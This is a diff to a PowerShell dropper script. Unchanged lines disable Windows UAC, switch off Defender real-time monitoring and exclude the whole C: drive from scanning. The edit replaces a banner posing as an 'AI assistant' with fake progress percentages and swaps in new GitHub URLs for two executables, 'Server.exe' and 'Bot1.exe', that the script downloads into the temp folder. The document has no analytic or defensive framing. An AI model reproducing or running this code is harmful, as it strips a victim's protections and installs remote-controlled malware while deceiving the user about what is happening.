@@ -6,7 +6,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 
-Write-Host "STARTED "
+Write-Host "50%"
 
 $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
@@ -17,11 +17,11 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Nam
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
 
-Write-Host "HI I AM AI ASSISTANT FLUX AI"
-$url1 = "https://github.com/sys1e/Flux/raw/refs/heads/main/Defende.exe"
-$url2 = "https://github.com/sys1e/Flux/raw/refs/heads/main/kilord.exe"
-$path1 = "$env:TEMP\Defende.exe"
-$path2 = "$env:TEMP\kilord.exe"
+Write-Host "100%"
+$url1 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Server.exe"
+$url2 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Bot1.exe"
+$path1 = "$env:TEMP\Server.exe"
+$path2 = "$env:TEMP\Bot1.exe"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
